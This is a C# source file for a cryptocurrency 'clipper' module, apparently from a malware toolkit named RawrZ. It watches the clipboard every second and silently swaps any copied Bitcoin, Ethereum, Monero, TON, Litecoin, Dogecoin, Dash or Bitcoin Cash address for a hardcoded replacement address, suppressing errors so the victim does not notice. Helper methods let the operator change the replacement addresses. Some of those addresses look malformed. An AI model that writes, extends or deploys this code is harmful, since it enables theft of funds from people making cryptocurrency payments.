using System;
using System.Runtime.InteropServices;
using System.Threading;
using System.Threading.Tasks;
using System.Text.RegularExpressions;
using System.Collections.Generic;
using System.Linq;

namespace RawrZDesktop.AdvancedModules
{
    public class ClipperModule
    {
        private static readonly Dictionary<string, string> _cryptoAddresses = new()
        {
            { "bitcoin", "1" },
            { "ethereum", "0x" },
            { "monero", "4" },
            { "ton", "UQ" },
            { "litecoin", "L" },
            { "bitcoin-cash", "q" },
            { "dogecoin", "D" },
            { "dash", "X" }
        };

        private static readonly Dictionary<string, string> _replacementAddresses = new()
        {
            { "bitcoin", "1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa" }, // Genesis block address
            { "ethereum", "0x742d35Cc6634C0532925a3b8D4C9db96C4b4d8b6" },
            { "monero", "4AdUndXHHZ6cFdRBDkkQ7DfB96V9GRsz4X7gqS7tU54J2gKUBd8Z2YAHKxmsjgo7Gn1D74WjWoWnva9HKZDAV7T0rx2qoh" },
            { "ton", "UQCD39VS5jcptHL8vMjEXrzGaRcCVYto7HUn4bpAOg8xqB2N" },
            { "litecoin", "LTC1qL7f5mFsiThfrXy3Yc2gJjJqX7X7X7X" },
            { "bitcoin-cash", "qpm2qsznhks23z7629mms6s4cwef74vcwvy22gdx6a" },
            { "dogecoin", "D7Y55r7sSx9b7vq9w7x7y7z7a7b7c7d7e7f" },
            { "dash", "XcY7WngaFh89QDsC1BicV2Nioz6BxGVK9d" }
        };

        private static bool _isRunning = false;
        private static CancellationTokenSource? _cancellationTokenSource;

        /// <summary>
        /// Starts the clipper module
        /// </summary>
        public static void StartClipper()
        {
            if (_isRunning) return;

            _isRunning = true;
            _cancellationTokenSource = new CancellationTokenSource();
            
            Task.Run(() => MonitorClipboard(_cancellationTokenSource.Token));
        }

        /// <summary>
        /// Stops the clipper module
        /// </summary>
        public static void StopClipper()
        {
            _isRunning = false;
            _cancellationTokenSource?.Cancel();
        }

        /// <summary>
        /// Monitors clipboard for cryptocurrency addresses
        /// </summary>
        private static async Task MonitorClipboard(CancellationToken cancellationToken)
        {
            string lastClipboardContent = "";
            
            while (!cancellationToken.IsCancellationRequested)
            {
                try
                {
                    string currentContent = GetClipboardText();
                    
                    if (!string.IsNullOrEmpty(currentContent) && currentContent != lastClipboardContent)
                    {
                        var detectedCrypto = DetectCryptocurrency(currentContent);
                        if (detectedCrypto != null)
                        {
                            var replacementAddress = GetReplacementAddress(detectedCrypto);
                            if (!string.IsNullOrEmpty(replacementAddress))
                            {
                                SetClipboardText(replacementAddress);
                            }
                        }
                        
                        lastClipboardContent = currentContent;
                    }
                    
                    await Task.Delay(1000, cancellationToken);
                }
                catch
                {
                    // Silently handle errors
                    await Task.Delay(5000, cancellationToken);
                }
            }
        }

        /// <summary>
        /// Detects cryptocurrency type from clipboard content
        /// </summary>
        private static string? DetectCryptocurrency(string content)
        {
            foreach (var crypto in _cryptoAddresses)
            {
                if (content.StartsWith(crypto.Value, StringComparison.OrdinalIgnoreCase))
                {
                    return crypto.Key;
                }
            }
            
            return null;
        }

        /// <summary>
        /// Gets replacement address for cryptocurrency
        /// </summary>
        private static string? GetReplacementAddress(string cryptoType)
        {
            return _replacementAddresses.TryGetValue(cryptoType, out var address) ? address : null;
        }

        /// <summary>
        /// Gets clipboard text
        /// </summary>
        private static string GetClipboardText()
        {
            try
            {
                return System.Windows.Forms.Clipboard.GetText();
            }
            catch
            {
                return "";
            }
        }

        /// <summary>
        /// Sets clipboard text
        /// </summary>
        private static void SetClipboardText(string text)
        {
            try
            {
                System.Windows.Forms.Clipboard.SetText(text);
            }
            catch
            {
                // Silently handle errors
            }
        }

        /// <summary>
        /// Validates cryptocurrency address format
        /// </summary>
        public static bool ValidateCryptoAddress(string address, string cryptoType)
        {
            if (string.IsNullOrEmpty(address) || string.IsNullOrEmpty(cryptoType))
                return false;

            return cryptoType.ToLower() switch
            {
                "bitcoin" => ValidateBitcoinAddress(address),
                "ethereum" => ValidateEthereumAddress(address),
                "monero" => ValidateMoneroAddress(address),
                "litecoin" => ValidateLitecoinAddress(address),
                "dogecoin" => ValidateDogecoinAddress(address),
                _ => false
            };
        }

        private static bool ValidateBitcoinAddress(string address)
        {
            // Basic Bitcoin address validation
            return address.Length >= 26 && address.Length <= 35 && 
                   (address.StartsWith("1") || address.StartsWith("3") || address.StartsWith("bc1"));
        }

        private static bool ValidateEthereumAddress(string address)
        {
            // Basic Ethereum address validation
            return address.Length == 42 && address.StartsWith("0x") && 
                   Regex.IsMatch(address, @"^0x[a-fA-F0-9]{40}$");
        }

        private static bool ValidateMoneroAddress(string address)
        {
            // Basic Monero address validation
            return address.Length == 95 && address.StartsWith("4");
        }

        private static bool ValidateLitecoinAddress(string address)
        {
            // Basic Litecoin address validation
            return address.Length >= 26 && address.Length <= 35 && 
                   (address.StartsWith("L") || address.StartsWith("M") || address.StartsWith("ltc1"));
        }

        private static bool ValidateDogecoinAddress(string address)
        {
            // Basic Dogecoin address validation
            return address.Length >= 26 && address.Length <= 35 && 
                   (address.StartsWith("D") || address.StartsWith("9") || address.StartsWith("A"));
        }

        /// <summary>
        /// Gets all replacement addresses
        /// </summary>
        public static Dictionary<string, string> GetReplacementAddresses()
        {
            return new Dictionary<string, string>(_replacementAddresses);
        }

        /// <summary>
        /// Adds a replacement address
        /// </summary>
        public static void AddReplacementAddress(string cryptoType, string address)
        {
            _replacementAddresses[cryptoType] = address;
        }

        /// <summary>
        /// Removes a replacement address
        /// </summary>
        public static void RemoveReplacementAddress(string cryptoType)
        {
            _replacementAddresses.Remove(cryptoType);
        }

        /// <summary>
        /// Gets whether the clipper is currently running
        /// </summary>
        public static bool IsRunning => _isRunning;

        /// <summary>
        /// Gets the count of replacement addresses
        /// </summary>
        public static int GetReplacementCount()
        {
            return _replacementAddresses.Count;
        }

        /// <summary>
        /// Gets clipper statistics
        /// </summary>
        public static Dictionary<string, object> GetStatistics()
        {
            return new Dictionary<string, object>
            {
                ["is_running"] = _isRunning,
                ["replacement_count"] = _replacementAddresses.Count,
                ["supported_cryptos"] = _cryptoAddresses.Keys.ToList(),
                ["replacement_addresses"] = _replacementAddresses
            };
        }
    }
}
